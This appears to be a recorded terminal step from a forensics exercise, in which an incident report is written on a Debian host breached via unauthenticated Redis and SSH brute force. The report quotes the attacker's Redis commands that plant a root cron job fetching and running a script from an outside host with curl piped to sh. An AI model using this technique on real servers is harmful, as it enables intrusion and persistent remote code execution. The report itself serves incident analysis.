[154.361589, "i", "cat << 'EOF' > /app/vuln-report.md\n# Vulnerability-Driven Entry Analysis Report\n\n## Vulnerability Assessment Summary\n- **Vulnerability Status**: No software CVE exploit detected; initial access was enabled by critical configuration weaknesses.\n- **SAS Vulnerability Feed**: `/sas/vulns.json` returned an empty set (`[]`).\n- **Reconciliation of Change Ticket CHG-5677**: Ticket item #2 incorrectly claimed CVE-2019-0708 (BlueKeep) on RDP. BlueKeep is a Windows Remote Desktop Services CVE, entirely irrelevant to Debian 12 Linux running Redis (`/sas/handoff/change-ticket.md:12`).\n\n## Detailed Vector & Root Cause Analysis\n\n### 1. Primary Entry Vector: Unauthenticated Redis Remote Access\n- **Mechanism**: The host ran a Redis server configured with `protected-mode no`, `bind 0.0.0.0`, and no `requirepass` password set (`/disk/etc/redis/redis.conf:3`).\n- **Exploitation Technique**: An attacker on the external network reached TCP port 6379 directly without authentication (`/sas/cti/advisory.txt:10`).\n- **Execution Pathway**: The attacker executed Redis administrative commands:\n  ```text\n  CONFIG SET dir /var/spool/cron/crontabs\n  CONFIG SET dbfilename root\n  SET payload \"\\n\\n* * * * * root curl hxxp://198.51.100.170/x | sh\\n\\n\"\n  SAVE\n  ```\n- **Evidence**: Verified in root crontab (`/disk/var/spool/cron/crontabs/root:4`) and threat intelligence advisory (`/sas/cti/advisory.txt:10`).\n\n### 2. Secondary Vector: SSH Brute-Force & Credential Abuse\n- **Mechanism**: Concurrent brute-force SSH attempts targeting multiple accounts (`root`, `admin`, `oracle`, `postgres`, `test`) originating from `198.51.100.170` (`/disk/var/log/auth.log:176`).\n- **Success**: Password authentication accepted for `root` at 00:55:02 UTC (`/disk/var/log/auth.log:208`).\n\n## CVE Evaluation & Confidence Assessment\n- **Software CVE Presence**: None (`/sas/vulns.json`).\n- **Classification**: CWE-306 (Missing Authentication for Critical Function) / CWE-1188 (Insecure Default Configuration).\n- **Analyst Confidence Level**: **HIGH**. Evidence across system configuration (`/disk/etc/redis/redis.conf:3`), crontab artifacts (`/disk/var/spool/cron/crontabs/root:4`), auth logs (`/disk/var/log/auth.log:208`), and vendor advisory (`/sas/cti/advisory.txt:10`) conclusively demonstrates entry via unauthenticated Redis administrative commands and credential abuse without software CVE exploitation.\nEOF\n"]
